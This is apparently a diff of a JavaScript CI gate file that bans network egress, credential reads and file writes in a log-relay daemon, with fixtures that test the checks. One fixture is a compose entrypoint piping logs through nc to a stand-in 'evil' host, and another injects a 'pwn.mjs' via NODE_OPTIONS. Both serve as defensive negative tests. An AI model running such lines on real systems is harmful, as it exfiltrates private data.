+//              a fixed port appearing under `node --test`'s parallel execution
+//              (this repo has a recorded global-lock flake class from exactly
+//              that shape).
+//
+// The dynamic-regexp needle is assembled from fragments so that no CODE line of
+// this file spells the constructor contiguously; the remote Semgrep gate matches
+// raw text as well as AST, and this repo has been red-ed by it 3x.
+// ---------------------------------------------------------------------------
 const HYGIENE_BANS = [
   `new reg${'exp('}`,
   'node:child_process',
@@ -1082,6 +2127,190 @@ const HYGIENE_BANS = [
   'settimeout(',
   'date.now(',
 ];
+
+/** The ONLY needles the daemon tier drops, each justified in the block above. */
+const DAEMON_RELAXED_BANS = ['node:http', '.listen(', 'setinterval(', 'settimeout('];
+
+/** Exactly one of these may appear in daemon.mjs, exactly once (AM16(b)). */
+const DAEMON_TIMER_CALLS = ['setinterval(', 'settimeout('];
+
+/**
+ * THE P5 TRIPWIRE (AM6). The OTLP POST client is deferred to 13r-c, so the
+ * daemon has ZERO egress — which makes this a FLAT ban rather than a
+ * conditional "egress must be to an allowed host" rule, i.e. both stronger and
+ * smaller than the alternative. The moment an outbound POST lands in daemon.mjs
+ * without the `PARKED — 13r-c` block being graduated, G9j reds here.
+ */
+const DAEMON_EGRESS_BANS = ['fetch(', '.request(', '.connect(', 'node:https', 'node:net', 'undici'];
+
+const DAEMON_BANS = [
+  ...new Set([
+    ...HYGIENE_BANS.filter((ban) => !DAEMON_RELAXED_BANS.includes(ban)),
+    ...DAEMON_EGRESS_BANS,
+  ]),
+];
+
+/**
+ * Every relay `.mjs` must resolve to EXACTLY ONE tier.
+ *
+ * A filename-keyed tier map fails OPEN for a file in neither list — it simply
+ * gets no bans applied — and these lists are HAND-EDITED, so "we will remember
+ * to add it" is the failure mode, not a hypothetical. Exactly-one also catches
+ * the opposite hand-edit: a file added to two tiers would silently take
+ * whichever the lookup found first.
+ */
+const RELAY_BAN_TIERS = [
+  {
+    id: 'pure',
+    files: [...RELAY_PURE_FILES, ...RELAY_PURE_TEST_FILES, RELAY_BATCH_CLI_FILE],
+    bans: HYGIENE_BANS,
+  },
+  { id: 'daemon', files: [RELAY_DAEMON_FILE], bans: DAEMON_BANS },
+  { id: 'daemon-test', files: [RELAY_DAEMON_TEST_FILE], bans: HYGIENE_BANS },
+];
+
+/**
+ * G9j — the tiered ban scan. `files` is `[{ name, source }]`, where `name` is
+ * the path RELATIVE TO relay/ (so a `.mjs` smuggled into `relay/fixtures/`
+ * arrives as `fixtures/x.mjs`, resolves to zero tiers, and reds).
+ */
+export function checkRelayBanTiers(files) {
+  if (!Array.isArray(files) || files.length === 0) {
+    return fail(
+      'G9j: ZERO relay .mjs files were handed to the ban scan — a scan of nothing passes ' +
+        'everything, and an absent relay is not a clean one',
+    );
+  }
+  const problems = [];
+  const classified = [];
+  for (const file of files) {
+    const tiers = RELAY_BAN_TIERS.filter((tier) => tier.files.includes(file.name));
+    if (tiers.length !== 1) {
+      problems.push(
+        `G9j (AM8): ${RELAY_REL}/${file.name} resolves to ${tiers.length} ban tiers ` +
+          `[${tiers.map((t) => t.id).join(', ') || 'none'}]; exactly 1 is required. A ` +
+          'filename-keyed tier map FAILS OPEN for an unclassified file — it would simply have no ' +
+          'bans applied — and these lists are hand-edited. Add the file to exactly one of ' +
+          `[${RELAY_BAN_TIERS.map((t) => t.id).join(', ')}] in the same change that creates it, ` +
+          'or delete it.',
+      );
+      continue;
+    }
+    const tier = tiers[0];
+    const lines = codeLines(file.source);
+    for (const ban of tier.bans) {
+      if (!lines.some((line) => line.includes(ban))) continue;
+      const isEgress = DAEMON_EGRESS_BANS.includes(ban);
+      problems.push(
+        `G9j (AM8): ${RELAY_REL}/${file.name} is in the ${tier.id.toUpperCase()} tier and ` +
+          `contains a banned construct (${ban}).` +
+          (isEgress
+            ? ' This is the P5 TRIPWIRE: the OTLP POST client is PARKED to 13r-c (see this ' +
+              "file's header), so the daemon has ZERO egress and this ban is flat. If an " +
+              'outbound POST is genuinely landing, GRADUATE the park — add the transport as an ' +
+              'injected seam with its outgoing header key set asserted exactly, relax only the ' +
+              'needle you need with a written reason, and delete the park block in the SAME ' +
+              'change. Do not widen the list to make a POST fit.'
+            : tier.id === 'daemon'
+              ? ' The DAEMON tier relaxes exactly ' +
+                `[${DAEMON_RELAXED_BANS.join(', ')}] and nothing else — this needle is not among ` +
+                'them, and relaxing it further is how this gate goes vacuous while CI stays green.'
+              : ` The ${tier.id.toUpperCase()} tier keeps all ${HYGIENE_BANS.length} bans. If ` +
+                'this file genuinely needs a runtime capability, it belongs in the daemon, not ' +
+                'here — moving the ban is not the fix.'),
+      );
+    }
+    if (tier.id === 'daemon') {
+      let timerSites = 0;
+      for (const line of lines) {
+        for (const call of DAEMON_TIMER_CALLS) timerSites += countOccurrences(line, call);
+      }
+      if (timerSites !== 1) {
+        problems.push(
+          `G9j (AM16(b)): ${RELAY_REL}/${file.name} contains ${timerSites} timer call sites ` +
+            `(${DAEMON_TIMER_CALLS.join(' / ')}); exactly 1 is required. ZERO means the poll loop ` +
+            'does not exist or hides behind an unreviewed construct; TWO means a second, ' +
+            'independent cadence nobody reviewed — and the relaxation exists for the poll loop ' +
+            'alone. The daemon takes its timer through an INJECTED seam, so the tests need none ' +
+            'of these at all.',
+        );
+      }
+    }
+    classified.push(`${file.name}:${tier.id}`);
+  }
+  if (problems.length > 0) return fail(problems.join(' || '));
+  return pass(
+    `G9j: ${files.length} relay .mjs file(s), each in exactly one ban tier ` +
+      `(${classified.join(', ')})`,
+  );
+}
+
+/**
+ * G9i's OBS-45 static half for ONE relay PRODUCTION file. Returns the problems
+ * it found; an empty array means clean.
+ *
+ * Extracted from the eval body so the T-p fixtures drive the SAME code path the
+ * gate runs, rather than a re-implementation that could drift from it.
+ */
+export function relayProductionProblems(file, source) {
+  const rel = `${RELAY_REL}/${file}`;
+  const lines = codeLines(source);
+  const problems = [];
+  for (const surface of CREDENTIAL_SURFACE) {
+    if (lines.some((line) => line.includes(surface))) {
+      problems.push(
+        `G9i (OBS-45): ${rel} exposes a credential surface (${surface}) — the relay reads the ` +
+          'same read-only bind mount Alloy does and must neither require nor accept a ' +
+          'module-owner credential',
+      );
+    }
+  }
+  for (const word of CREDENTIAL_WORDS) {
+    if (lines.some((line) => containsCredentialWord(line, word))) {
+      problems.push(
+        `G9i (OBS-45): ${rel} reads a \`${word}\`-shaped value — OBS-45 forbids the relay ` +
+          'REQUIRING or ACCEPTING a module-owner credential, and an env read is acceptance',
+      );
+    }
+  }
+  for (const api of WRITE_APIS) {
+    if (lines.some((line) => line.includes(api))) {
+      problems.push(
+        `G9i (OBS-45): ${rel} calls a write API (${api}). Every relay file is read-only: both ` +
+          'shells emit their document on STDOUT, so a write call has no legitimate caller here — ' +
+          'and D2 forbids an offset checkpoint file specifically, which is the one a tail-follow ' +
+          'daemon is most tempted to write.',
+      );
+    }
+  }
+  for (const literal of NETWORK_LITERAL_BANS) {
+    if (lines.some((line) => line.includes(literal))) {
+      problems.push(
+        `G9i (AM16(a)): ${rel} spells \`${literal}\` in code. \`0.0.0.0\` would make OBS-17's ` +
+          'loopback rule a statement about the compose file only; a `://` scheme literal is what ' +
+          'the remote-only Semgrep raw-URL rule matches, and local `just ci` cannot catch it — ' +
+          'the fix after a push costs a squash onto a fresh branch, because force-push is ' +
+          'hook-blocked. Assemble it from fragments or take it from a flag.',
+      );
+    }
+  }
+  if (RELAY_PURE_FILES.includes(file) && lines.some((line) => line.includes('node:fs'))) {
+    problems.push(
+      `G9i: ${rel} imports node:fs — the pure core takes text in and returns data out; all I/O ` +
+        'belongs to an imperative shell',
+    );
+  }
+  if (
+    RELAY_SHELL_FILES.includes(file) &&
+    !lines.some((line) => RELAY_READ_APIS.some((api) => line.includes(api)))
+  ) {
+    problems.push(
+      `G9i: ${rel} never reads the logs directory (none of [${RELAY_READ_APIS.join(', ')}]) — a ` +
+        'shell that reads nothing cannot be confirmed to read it READ-ONLY',
+    );
+  }
+  return problems;
+}
 
 // ===========================================================================
 // 13r-a (ADR-0190) — G12a..G12e, the boot tripwires
@@ -2275,32 +3504,362 @@ function alloyS4Fixture(o = {}) {
   return out.join('\n');
 }
 
+// ---------------------------------------------------------------------------
+// 13r-b fixtures (T-m..T-p). Inline strings only — no fixture file is written.
+// Every builder produces the COMPLIANT shape by default so each tooth proves its
+// detector ACCEPTS the good shape before proving it rejects the bad one.
+// ---------------------------------------------------------------------------
+
+/**
+ * The host path BOTH services mount. Spelled once here, and read from the alloy
+ * block by the detector — the fixture and the gate must not agree by accident.
+ */
+const FIXTURE_MOUNT_SOURCE = '${MR_SPACETIME_DATA_DIR:-/var/lib/spacetime}/replicas';
+
+/**
+ * AM1 — the relay's CONTAINER target deliberately avoids the substring
+ * `replicas`. `checkModuleLogsMountReadOnly` (C5,
+ * checks/stack-config-checks.mjs:426-433) counts ANY whole-file line trimming to
+ * `- ...replicas...` (without a `type:`) as a mount and requires it to end
+ * `:ro` — so a compose `command:` list item `- --logs-dir=/data/replicas` is
+ * itself read as a writable mount and C5 FAILS. Both lenses PoC'd this; the
+ * prescribed "byte-identical mount shape" was literally unbuildable. The SOURCE
+ * stays byte-identical to alloy's (which is what OBS-45's "the same bind mount"
+ * is a claim about); the TARGET drops the substring. T-m pins BOTH halves of
+ * that reasoning so a future author cannot "tidy" the target back.
+ */
+const FIXTURE_MOUNT_TARGET = '/data/module-logs';
+const FIXTURE_RELAY_PORT = 9101;
+
+function relayCompose(o = {}) {
+  const out = ['services:'];
+  // PROMETHEUS FIRST, carrying its own `--web.listen-address=127.0.0.1:9090`.
+  // This is not decoration: a file-wide `indexOf('--web.listen-address=')` over
+  // docker-compose.yml finds THIS occurrence (the real file's is at :51), so an
+  // unscoped G9o would compare the relay's scrape target against 9090 and pass
+  // a target nothing answers. T-n asserts the ordering explicitly.
+  out.push('  prometheus:');
+  out.push('    image: prom/prometheus:v3.13.2@sha256:0a0a');
+  out.push('    network_mode: host');
+  out.push('    command:');
+  out.push('      - --config.file=/etc/prometheus/prometheus.yml');
+  out.push('      - --web.listen-address=127.0.0.1:9090');
+  out.push('  alloy:');
+  out.push('    image: grafana/alloy:v1.18.1@sha256:0b0b');
+  out.push('    network_mode: host');
+  out.push('    volumes:');
+  out.push('      - ./alloy/config.alloy:/etc/alloy/config.alloy:ro');
+  out.push(`      - ${o.alloySource ?? FIXTURE_MOUNT_SOURCE}:/data/replicas:ro`);
+  out.push('      - alloy-data:/var/lib/alloy/data');
+  if (o.omitRelay === true) return out.join('\n');
+
+  out.push(`  ${RELAY_SERVICE_NAME}:`);
+  out.push('    image: node:24-alpine@sha256:0c0c');
+  out.push('    network_mode: host');
+  out.push('    restart: unless-stopped');
+  out.push('    user: "473:473"');
+  out.push('    read_only: true');
+  for (const extra of o.extraLines ?? []) out.push(extra);
+  if (o.omitVolumes !== true) {
+    out.push('    volumes:');
+    out.push('      - ./relay:/opt/relay:ro');
+    if (o.omitMount !== true) {
+      out.push(
+        `      - ${o.mountSource ?? FIXTURE_MOUNT_SOURCE}:${o.mountTarget ?? FIXTURE_MOUNT_TARGET}` +
+          `${o.mountMode ?? ':ro'}`,
+      );
+    }
+  }
+  if (o.omitCommand !== true) {
+    out.push('    command:');
+    const command = o.command ?? [
+      'node',
+      '/opt/relay/daemon.mjs',
+      `--logs-dir=${o.logsDir ?? FIXTURE_MOUNT_TARGET}`,
+      `--web.listen-address=127.0.0.1:${o.port ?? FIXTURE_RELAY_PORT}`,
+      '--trace-pair-set=/opt/relay/trace-pair-set.json',
+    ];
+    for (const item of command) out.push(`      - ${item}`);
+  }
+  out.push('    mem_limit: 256m');
+  out.push('    cpus: 0.5');
+  return out.join('\n');
+}
+
+function relayJobLines(o = {}) {
+  const lines = [`  - job_name: ${o.jobName ?? RELAY_SERVICE_NAME}`];
+  if (o.omitMetricsPath !== true) lines.push(`    metrics_path: ${o.metricsPath ?? '/health'}`);
+  lines.push('    static_configs:');
+  lines.push(`      - targets: ['${o.host ?? '127.0.0.1'}:${o.port ?? FIXTURE_RELAY_PORT}']`);
+  return lines;
+}
+
+function relayPrometheus(o = {}) {
+  const out = [];
+  // The AM12 decoy: a structurally PERFECT relay job under a top-level key that
+  // is not `scrape_configs:`. Prometheus ignores it entirely; a flat line scan
+  // for `job_name: mr-trace-relay` calls the target wired. It sits BEFORE
+  // `scrape_configs:` so a first-match search finds it first.
+  if (o.decoy === true) {
+    out.push('x-parked:');
+    out.push(...relayJobLines(o));
+    out.push('');
+  }
+  out.push('scrape_configs:');
+  out.push('  - job_name: spacetimedb');
+  out.push('    metrics_path: /v1/metrics');
+  out.push('    static_configs:');
+  out.push("      - targets: ['127.0.0.1:3000']");
+  out.push('');
+  // No `metrics_path:` here on purpose: the default is legitimate for alloy, so
+  // the gate must require the key on the RELAY job specifically, not globally.
+  out.push('  - job_name: alloy');
+  out.push('    static_configs:');
+  out.push("      - targets: ['127.0.0.1:12345']");
+  if (o.omitJob !== true && o.decoy !== true) {
+    out.push('');
+    out.push(...relayJobLines(o));
+  }
+  return out.join('\n');
+}
+
+/** One provisioned alert rule, in the exact `data:`/`__expr__` shape rules.yml uses. */
+function alertRuleLines(o = {}) {
+  const exprRef = o.exprRefId ?? 'A';
+  const condRef = o.condRefId ?? 'C';
+  const lines = [`      - uid: ${o.uid}`];
+  lines.push(`        title: ${o.title}`);
+  lines.push(`        condition: ${o.condition ?? condRef}`);
+  if (o.isPaused !== undefined) lines.push(`        isPaused: ${o.isPaused}`);
+  // `for:` PRECEDES `expr:` here exactly as it does in the committed file — the
+  // scan-direction trap is baked into the fixture rather than described.
+  lines.push(`        for: ${o.forValue}`);
+  lines.push('        labels:');
+  lines.push(`          severity: ${o.severity ?? 'critical'}`);
+  lines.push('        annotations:');
+  lines.push(`          summary: ${o.title} has been down.`);
+  lines.push('        data:');
+  lines.push(`          - refId: ${exprRef}`);
+  lines.push('            relativeTimeRange:');
+  lines.push('              from: 300');
+  lines.push('              to: 0');
+  lines.push(`            datasourceUid: ${o.datasourceUid ?? 'mr-prometheus'}`);
+  lines.push('            model:');
+  lines.push(`              refId: ${exprRef}`);
+  lines.push('              instant: true');
+  lines.push(`              expr: ${o.expr}`);
+  lines.push(`          - refId: ${condRef}`);
+  lines.push(`            datasourceUid: ${o.conditionDatasourceUid ?? '__expr__'}`);
+  lines.push('            model:');
+  lines.push(`              refId: ${condRef}`);
+  lines.push(`              type: ${o.thresholdType ?? 'threshold'}`);
+  lines.push(`              expression: ${o.expression ?? exprRef}`);
+  lines.push('              conditions:');
+  lines.push('                - evaluator:');
+  lines.push(`                    type: ${o.evaluatorType ?? 'lt'}`);
+  lines.push('                    params:');
+  for (const param of o.params ?? ['1']) lines.push(`                      - ${param}`);
+  return lines;
+}
+
+function relayRuleLines(o = {}) {
+  return alertRuleLines({
+    uid: o.relayUid ?? 'mr-trace-relay-down',
+    title: 'TraceRelayDown',
+    forValue: o.relayFor ?? '60s',
+    expr: o.relayExpr ?? RELAY_UP_NEEDLE,
+    severity: o.relaySeverity,
+    condition: o.relayCondition,
+    evaluatorType: o.relayEvaluatorType,
+    thresholdType: o.relayThresholdType,
+    params: o.relayParams,
+    isPaused: o.relayPaused,
+    datasourceUid: o.relayDatasourceUid,
+    conditionDatasourceUid: o.relayConditionDatasourceUid,
+    expression: o.relayExpression,
+  });
+}
+
+/**
+ * A rules.yml with AlloyDown (`for: 60s`), AlloyIngestStalled (`for: 10m`) and
+ * the relay rule, IN THAT ORDER — three rules with THREE DIFFERENT `for:`
+ * values. A detector that finds AlloyDown by its `expr:` and then scans FORWARD
+ * for a `for:` reads AlloyIngestStalled's 10m, so the "relay for: == AlloyDown
+ * for:" clause would accept `for: 10m` and reject the correct `60s`. Both
+ * mistakes are tested in T-o.
+ */
+function deadMansRulesDoc(o = {}) {
+  const lines = ['apiVersion: 1', '', 'groups:'];
+  lines.push('  - orgId: 1');
+  lines.push('    name: meta-monitoring');
+  lines.push('    folder: Monster Realm');
+  lines.push(`    interval: ${o.interval ?? '20s'}`);
+  lines.push('    rules:');
+  lines.push(
+    ...alertRuleLines({
+      uid: 'mr-alloy-down',
+      title: 'AlloyDown',
+      forValue: '60s',
+      expr: o.alloyExpr ?? ALLOY_UP_NEEDLE,
+    }),
+  );
+  lines.push(
+    ...alertRuleLines({
+      uid: 'mr-alloy-ingest-stalled',
+      title: 'AlloyIngestStalled',
+      forValue: '10m',
+      severity: 'warning',
+      expr: 'mr:alloy_log_bytes_read:rate5m',
+    }),
+  );
+  if (o.omitRelayRule !== true && o.relayInSecondGroup !== true) {
+    lines.push(...relayRuleLines(o));
+  }
+  if (o.relayInSecondGroup === true) {
+    lines.push('  - orgId: 1');
+    lines.push('    name: relay-monitoring');
+    lines.push('    folder: Monster Realm');
+    lines.push(`    interval: ${o.relayGroupInterval ?? '60s'}`);
+    lines.push('    rules:');
+    lines.push(...relayRuleLines(o));
+  }
+  return lines.join('\n');
+}
+
+// --- T-p source fixtures ----------------------------------------------------
+// Real-shaped relay sources, one per ban tier. The cheats below are each a
+// MINIMAL delta from the corresponding good shape, so a tooth that reddens
+// reddens for the construct it names and nothing else.
+
+const PURE_GOOD = [
+  'export function decide(state, observation) {',
+  '  if (observation.size > state.prevOffset) {',
+  "    return { readFrom: state.prevOffset, readTo: observation.size, reason: 'growth' };",
+  '  }',
+  "  return { readFrom: 0, readTo: 0, reason: 'noChange' };",
+  '}',
+].join('\n');
+
+const BATCH_CLI_GOOD = [
+  "import { readdirSync, readFileSync } from 'node:fs';",
+  "import { reconstruct } from './reconstruct.mjs';",
+  '',
+  'export function collectLogFiles(dir) {',
+  "  return readdirSync(dir).filter((name) => name.endsWith('.log'));",
+  '}',
+  '',
+  'export function readAll(file) {',
+  "  return readFileSync(file, 'utf8');",
+  '}',
+  '',
+  'export function run(files, membership) {',
+  '  return reconstruct(files.map(readAll), { tracePairSet: membership });',
+  '}',
+].join('\n');
+
+const DAEMON_GOOD = [
+  "import { createServer } from 'node:http';",
+  "import { createReadStream, statSync } from 'node:fs';",
+  '',
+  "import { collectLogFiles } from './mr-trace-relay.mjs';",
+  "import { decide } from './tail.mjs';",
+  '',
+  'export function startDaemon(options) {',
+  '  const server = createServer((req, res) => {',
+  '    res.end(renderExposition(options.state));',
+  '  });',
+  '  server.listen(options.port, options.host);',
+  '  const timer = setInterval(() => poll(options), options.pollMs);',
+  '  return { server, timer };',
+  '}',
+  '',
+  'function poll(options) {',
+  '  for (const file of collectLogFiles(options.logsDir)) {',
+  '    const plan = decide(options.state.get(file), statSync(file));',
+  '    createReadStream(file, { start: plan.readFrom, end: plan.readTo - 1 });',
+  '  }',
+  '}',
+].join('\n');
+
+const DAEMON_TEST_GOOD = [
+  "import test from 'node:test';",
+  "import assert from 'node:assert/strict';",
+  '',
+  "import { startDaemon } from './daemon.mjs';",
+  '',
+  "test('the dispatch surface is exactly /health', () => {",
+  '  const transport = { bound: false, bind() { this.bound = true; } };',
+  '  const clock = { armed: null, setTimer(fn) { this.armed = fn; } };',
+  '  const daemon = startDaemon({ transport, clock });',
+  "  assert.deepEqual(Object.keys(daemon.routes), ['/health']);",
+  '});',
+].join('\n');
+
+const DAEMON_NO_READ = [
+  "import { createServer } from 'node:http';",
+  '',
+  'export function startDaemon(options) {',
+  '  const server = createServer((req, res) => res.end());',
+  '  server.listen(options.port, options.host);',
+  '  setInterval(() => options.tick(), options.pollMs);',
+  '  return server;',
+  '}',
+].join('\n');
+
+// Assembled from fragments so that no CODE line of THIS file spells the
+// dynamic-regexp constructor contiguously (remote Semgrep matches raw text) —
+// while the fixture itself contains it verbatim, which is what must be caught.
+const DAEMON_WITH_DYNAMIC_REGEXP = `${DAEMON_GOOD}\nconst rx = new Reg${'Exp('}options.pattern);`;
+const DAEMON_WITH_CHILD_PROCESS = `${DAEMON_GOOD}\nimport { execSync } from 'node:child_process';`;
+const DAEMON_WITH_FETCH = `${DAEMON_GOOD}\nawait fetch(options.endpoint, { method: 'POST' });`;
+const DAEMON_WITH_REQUEST = `${DAEMON_GOOD}\nconst out = client.request(options.headers);`;
+const DAEMON_WITH_UNDICI = `${DAEMON_GOOD}\nimport { Agent } from 'undici';`;
+const DAEMON_WITH_DATE_NOW = `${DAEMON_GOOD}\nconst emittedAt = Date.now();`;
+const DAEMON_WITH_TWO_TIMERS = `${DAEMON_GOOD}\nsetTimeout(() => flush(options), 5000);`;
+const DAEMON_TEST_WITH_LISTEN = `${DAEMON_TEST_GOOD}\nserver.listen(9101);`;
+const PURE_WITH_NODE_HTTP = `${PURE_GOOD}\nimport { createServer } from 'node:http';`;
+const PURE_WITH_NODE_FS = `${PURE_GOOD}\nimport { statSync } from 'node:fs';`;
+const DAEMON_WITH_WILDCARD_BIND = `${DAEMON_GOOD}\nconst host = '0.0.0.0';`;
+// Assembled: the eval must not itself spell a contiguous scheme separator.
+const DAEMON_WITH_SCHEME = `${DAEMON_GOOD}\nconst sink = 'otlp${':'}${'//'}collector';`;
+// AM7's executed cheat, verbatim in shape: a promise-API append plus a bulk
+// copy. Neither `open(` nor `cpsync` was in WRITE_APIS when this scanned GREEN.
+const DAEMON_WITH_OPEN_WRITE = `${DAEMON_GOOD}\nconst fh = await open(options.checkpoint, 'a');\nawait fh.write(doc);`;
+const DAEMON_WITH_CP_SYNC = `${DAEMON_GOOD}\ncpSync(options.logsDir, options.spool, { recursive: true });`;
+const DAEMON_WITH_CREDENTIAL = `${DAEMON_GOOD}\nconst auth = process.env.MR_RELAY_TOKEN;`;
+
 const TEETH = [
   {
     id: 'T-a',
-    // Kills a service-set check that counts instead of comparing, and proves
-    // G9g's detector actually sees an 8th service arriving.
+    // INVERTED in 13r-b (P1 graduated). Until this slice this tooth asserted
+    // that an 8-service compose was REJECTED — the m20e-2 park tripwire. The
+    // relay has landed, so the polarity flips, and the tooth's real job is
+    // unchanged: kill a service-set check that COUNTS instead of comparing.
+    // Both rejection cases keep a count of 8 or a count of 7 that "looks right",
+    // which is exactly why set equality is the bar.
     run() {
-      const seven = checkServiceSetExact(composeWith(SEVEN_SERVICES), SEVEN_SERVICES);
-      if (!seven.ok) return `the real 7-service shape was rejected: ${seven.detail}`;
-      const eight = checkServiceSetExact(
-        composeWith([...SEVEN_SERVICES, RELAY_SERVICE_NAME]),
-        SEVEN_SERVICES,
-      );
-      if (eight.ok) return 'an 8-service compose (the parked relay landing) was accepted';
+      const eight = checkServiceSetExact(composeWith(EIGHT_SERVICES), EIGHT_SERVICES);
+      if (!eight.ok) return `the committed 8-service shape was rejected: ${eight.detail}`;
+
+      const withoutRelay = EIGHT_SERVICES.filter((n) => n !== RELAY_SERVICE_NAME);
+      const seven = checkServiceSetExact(composeWith(withoutRelay), EIGHT_SERVICES);
+      if (seven.ok) {
+        return 'a 7-service compose with the relay MISSING was accepted — that is the pre-13r-b tree, and it must not read as green now that a scrape job and an alert rule point at that service';
+      }
+      if (!seven.detail.includes(RELAY_SERVICE_NAME)) {
+        return `the missing-relay failure does not name the service: ${seven.detail}`;
+      }
+
       const substituted = checkServiceSetExact(
-        composeWith([
-          'prometheus',
-          'alloy',
-          'loki',
-          'tempo',
-          'grafana',
-          'node_exporter',
-          'datadog',
-        ]),
-        SEVEN_SERVICES,
+        composeWith([...withoutRelay, 'datadog']),
+        EIGHT_SERVICES,
       );
-      if (substituted.ok) return 'a 7-service compose with `datadog` substituted in was accepted';
+      if (substituted.ok) {
+        return 'an 8-service compose with `datadog` substituted for the relay was accepted — the COUNT is identical, which is the entire reason this is a set comparison';
+      }
+      if (checkServiceSetExact(composeWith([...EIGHT_SERVICES, 'datadog']), EIGHT_SERVICES).ok) {
+        return 'a 9th service riding alongside the expected 8 was accepted';
+      }
       return null;
     },
   },
@@ -2973,6 +4532,492 @@ const TEETH = [
       return null;
     },
   },
+  {
+    id: 'T-m',
+    // G9n. Kills: a mount check that accepts the relay having NO mount at all
+    // (which C5 does — its only floor is `found === 0`); one that accepts `:rw`
+    // or a bare mount; one that accepts a DIFFERENT host path holding a copy of
+    // the same files; one that never ties the mount to the code path that reads
+    // it; and the whole injection surface C3/C5/C6/C7/C17 miss on this service,
+    // where a PoC'd block with an `entrypoint:`, an `env_file:`, NODE_OPTIONS,
+    // NODE_USE_ENV_PROXY, an HTTPS_PROXY carrying credentials and an
+    // MR_RELAY_KEY passed all five.
+    run() {
+      const good = checkRelayMountMirrorsAlloy(relayCompose());
+      if (!good.ok) return `the committed relay block was rejected: ${good.detail}`;
+
+      // AM1, pinned in BOTH directions. The container target must not contain
+      // `replicas`, because C5 reads any `- ...replicas...` line — INCLUDING a
+      // `command:` item — as a mount and requires it to end `:ro`.
+      const c5 = checkModuleLogsMountReadOnly(relayCompose());
+      if (!c5.ok) {
+        return `AM1: the committed relay shape REDS C5 (checkModuleLogsMountReadOnly): ${c5.detail}. The container target and the --logs-dir value must not contain the substring 'replicas'.`;
+      }
+      const am1 = checkModuleLogsMountReadOnly(
+        relayCompose({ mountTarget: '/data/replicas', logsDir: '/data/replicas' }),
+      );
+      if (am1.ok) {
+        return 'AM1: a `- --logs-dir=/data/replicas` command item did NOT red C5 — the fixture no longer demonstrates the unbuildable shape FIXTURE_MOUNT_TARGET exists to avoid, so the comment above it has become a story rather than a fact';
+      }
+
+      if (checkRelayMountMirrorsAlloy(relayCompose({ omitRelay: true })).ok) {
+        return 'a compose with no `mr-trace-relay:` service at all was accepted';
+      }
+      const noMount = checkRelayMountMirrorsAlloy(relayCompose({ omitMount: true }));
+      if (noMount.ok) {
+        return "a relay with `./relay:/opt/relay:ro` but NO replicas mount was accepted — this is exactly the shape C5 passes, because alloy's own mount keeps its `found` count at 1";
+      }
+      if (checkRelayMountMirrorsAlloy(relayCompose({ omitVolumes: true })).ok) {
+        return 'a relay with no `volumes:` key at all was accepted';
+      }
+      if (checkRelayMountMirrorsAlloy(relayCompose({ mountMode: ':rw' })).ok) {
+        return 'a `:rw` relay mount was accepted';
+      }
+      if (checkRelayMountMirrorsAlloy(relayCompose({ mountMode: '' })).ok) {
+        return 'a BARE relay mount with no mode was accepted — Docker defaults it to read-write, so omission is the trap';
+      }
+      const otherSource = checkRelayMountMirrorsAlloy(
+        relayCompose({ mountSource: '/srv/spacetime-copy/replicas' }),
+      );
+      if (otherSource.ok) {
+        return 'a relay mount from a DIFFERENT host path was accepted — OBS-45 says "the SAME read-only bind mount as Alloy", and a second path holding a copy drifts the first time either side is re-pointed';
+      }
+      if (checkRelayMountMirrorsAlloy(relayCompose({ logsDir: '/tmp/logs' })).ok) {
+        return 'a `--logs-dir` OUTSIDE the mount target was accepted — a perfectly read-only mount the process never reads from proves nothing';
+      }
+      if (
+        checkRelayMountMirrorsAlloy(relayCompose({ logsDir: `${FIXTURE_MOUNT_TARGET}-evil` })).ok
+      ) {
+        return 'a `--logs-dir` that merely shares a PREFIX with the mount target was accepted';
+      }
+
+      // The injection surface. Each of these passed C3, C5, C6, C7 and C17.
+      const smuggled = [
+        ['    entrypoint: /bin/sh -c "cat /data/module-logs/* | nc evil 9000"'],
+        ['    env_file:', '      - ./relay.env'],
+        ['    environment:', '      - NODE_OPTIONS=--import=/opt/relay/pwn.mjs'],
+        ['    environment:', '      - NODE_USE_ENV_PROXY=1'],
+        ['    healthcheck:', '      test: /bin/sh -c "true"'],
+      ];
+      for (const extraLines of smuggled) {
+        const key = extraLines[0].trim().split(':')[0];
+        if (checkRelayMountMirrorsAlloy(relayCompose({ extraLines })).ok) {
+          return `\`${key}\` was accepted on an otherwise-compliant relay block — checkNoExecLogSource (C7) is hardcoded to the \`alloy\` service, so nothing else in this eval looks at it`;
+        }
+      }
+
+      // The command allowlist, in both directions.
+      const withToken = checkRelayMountMirrorsAlloy(
+        relayCompose({
+          command: [
+            'node',
+            '/opt/relay/daemon.mjs',
+            `--logs-dir=${FIXTURE_MOUNT_TARGET}`,
+            `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
+            '--trace-pair-set=/opt/relay/trace-pair-set.json',
+            '--module-owner-token=/run/secrets/owner',
+          ],
+        }),
+      );
+      if (withToken.ok) {
+        return 'a sixth `--module-owner-token=` flag was accepted — OBS-45 forbids the relay ACCEPTING a module-owner credential, and an allowlist is used here precisely because a credential-NAME denylist is unclosable';
+      }
+      if (
+        checkRelayMountMirrorsAlloy(
+          relayCompose({
+            command: [
+              'node',
+              '/opt/relay/daemon.mjs',
+              `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
+              '--trace-pair-set=/opt/relay/trace-pair-set.json',
+            ],
+          }),
+        ).ok
+      ) {
+        return 'a command MISSING `--logs-dir` was accepted';
+      }
+      const bareFirst = checkRelayMountMirrorsAlloy(
+        relayCompose({
+          command: [
+            `--logs-dir=${FIXTURE_MOUNT_TARGET}`,
+            `--web.listen-address=127.0.0.1:${FIXTURE_RELAY_PORT}`,
+            '--trace-pair-set=/opt/relay/trace-pair-set.json',
+          ],
+        }),
+      );
+      if (bareFirst.ok) {
+        return 'a command whose FIRST item is a flag was accepted — the node:*-alpine entrypoint only prepends `node` when $1 does not start with `-`, so this container dies on start (AM5)';
+      }
+      if (checkRelayMountMirrorsAlloy(relayCompose({ omitCommand: true })).ok) {
+        return 'a relay service with NO `command:` was accepted — the node image default is a REPL';
+      }
+      return null;
+    },
+  },
+  {
+    id: 'T-n',
+    // G9o. Kills: a flat `job_name: mr-trace-relay` line scan (the decoy sits
+    // under a top-level key Prometheus never reads); a job with no
+    // `metrics_path:` (which silently scrapes /metrics and 404s); and — the
+    // tooth that matters most — a port comparison that reads the listen flag
+    // file-wide instead of from the relay's own block, which returns
+    // PROMETHEUS's 9090.
+    run() {
+      const compose = relayCompose();
+      const good = checkRelayScrapeJobWired(relayPrometheus(), compose);
+      if (!good.ok) return `the committed scrape job was rejected: ${good.detail}`;
+
